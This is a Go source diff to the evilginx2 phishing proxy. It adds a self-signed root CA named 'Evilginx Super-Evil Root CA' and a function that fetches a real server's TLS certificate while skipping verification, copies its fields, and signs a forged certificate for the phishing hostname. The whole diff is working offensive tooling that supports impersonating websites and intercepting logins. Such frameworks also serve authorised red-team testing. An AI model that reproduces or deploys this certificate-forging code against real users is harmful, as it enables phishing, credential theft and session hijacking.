@@ -6,18 +6,22 @@ import (
 	"crypto/rsa"
 	"crypto/tls"
 	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/pem"
 	"fmt"
 	"github.com/xenolf/lego/acme"
 	"io/ioutil"
+	"math/big"
 	"os"
 	"path/filepath"
+	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 )
 
 type CertDb struct {
 	PrivateKey *rsa.PrivateKey
+	CACert     tls.Certificate
 	client     *acme.Client
 	certUser   CertUser
 	dataDir    string
@@ -25,6 +29,7 @@ type CertDb struct {
 	hs         *HttpServer
 	cfg        *Config
 	cache      map[string]map[string]*tls.Certificate
+	tls_cache  map[string]*tls.Certificate
 }
 
 type CertUser struct {
@@ -88,8 +93,9 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 
 	acme.Logger = log.NullLogger()
 	d.cache = make(map[string]map[string]*tls.Certificate)
+	d.tls_cache = make(map[string]*tls.Certificate)
 
-	pkey_data, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
+	pkey_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "private.key"))
 	if err != nil {
 		// private key corrupted or not found, recreate and delete all public certificates
 		os.RemoveAll(filepath.Join(data_dir, "*"))
@@ -98,16 +104,16 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 		if err != nil {
 			return nil, fmt.Errorf("private key generation failed")
 		}
-		pkey_data = pem.EncodeToMemory(&pem.Block{
+		pkey_pem = pem.EncodeToMemory(&pem.Block{
 			Type:  "RSA PRIVATE KEY",
 			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
 		})
-		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_data, 0600)
+		err = ioutil.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
 		if err != nil {
 			return nil, err
 		}
 	} else {
-		block, _ := pem.Decode(pkey_data)
+		block, _ := pem.Decode(pkey_pem)
 		if block == nil {
 			return nil, fmt.Errorf("private key is corrupted")
 		}
@@ -116,6 +122,53 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 		if err != nil {
 			return nil, err
 		}
+	}
+
+	ca_crt_pem, err := ioutil.ReadFile(filepath.Join(data_dir, "ca.crt"))
+	if err != nil {
+		notBefore := time.Now()
+		aYear := time.Duration(10*365*24) * time.Hour
+		notAfter := notBefore.Add(aYear)
+		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
+		if err != nil {
+			return nil, err
+		}
+
+		template := x509.Certificate{
+			SerialNumber: serialNumber,
+			Subject: pkix.Name{
+				Country:            []string{},
+				Locality:           []string{},
+				Organization:       []string{"Evilginx Signature Trust Co."},
+				OrganizationalUnit: []string{},
+				CommonName:         "Evilginx Super-Evil Root CA",
+			},
+			NotBefore:             notBefore,
+			NotAfter:              notAfter,
+			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
+			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
+			BasicConstraintsValid: true,
+			IsCA: true,
+		}
+
+		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &d.PrivateKey.PublicKey, d.PrivateKey)
+		if err != nil {
+			return nil, err
+		}
+		ca_crt_pem = pem.EncodeToMemory(&pem.Block{
+			Type:  "CERTIFICATE",
+			Bytes: cert,
+		})
+		err = ioutil.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
+		if err != nil {
+			return nil, err
+		}
+	}
+
+	d.CACert, err = tls.X509KeyPair(ca_crt_pem, pkey_pem)
+	if err != nil {
+		return nil, err
 	}
 
 	d.certUser = CertUser{
@@ -226,4 +279,71 @@ func (d *CertDb) obtainCertificate(site_name string, base_domain string, domains
 	}
 
 	return nil
+}
+
+func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
+	log.Debug("Fetching TLS certificate from %s:%d ...", host, port)
+
+	config := tls.Config{InsecureSkipVerify: true}
+	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
+	if err != nil {
+		log.Warning("Could not fetch TLS certificate from %s:%d: %s", host, port, err)
+		return nil
+	}
+	defer conn.Close()
+
+	state := conn.ConnectionState()
+
+	return state.PeerCertificates[0]
+}
+
+func (d *CertDb) SignCertificateForHost(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
+	var x509ca *x509.Certificate
+	var template x509.Certificate
+
+	cert, ok := d.tls_cache[host]
+	if ok {
+		return cert, nil
+	}
+
+	if x509ca, err = x509.ParseCertificate(d.CACert.Certificate[0]); err != nil {
+		return
+	}
+
+	srvCert := d.getServerCertificate(host, port)
+	if srvCert == nil {
+		return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
+	} else {
+		template = x509.Certificate{
+			SerialNumber:          srvCert.SerialNumber,
+			Issuer:                x509ca.Subject,
+			Subject:               srvCert.Subject,
+			NotBefore:             srvCert.NotBefore,
+			NotAfter:              srvCert.NotAfter,
+			KeyUsage:              srvCert.KeyUsage,
+			ExtKeyUsage:           srvCert.ExtKeyUsage,
+			IPAddresses:           srvCert.IPAddresses,
+			DNSNames:              []string{phish_host},
+			BasicConstraintsValid: true,
+		}
+		template.Subject.CommonName = phish_host
+	}
+
+	var pkey *rsa.PrivateKey
+	if pkey, err = rsa.GenerateKey(rand.Reader, 1024); err != nil {
+		return
+	}
+
+	var derBytes []byte
+	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
+		return
+	}
+
+	cert = &tls.Certificate{
+		Certificate: [][]byte{derBytes, d.CACert.Certificate[0]},
+		PrivateKey:  pkey,
+	}
+
+	d.tls_cache[host] = cert
+	return cert, nil
 }
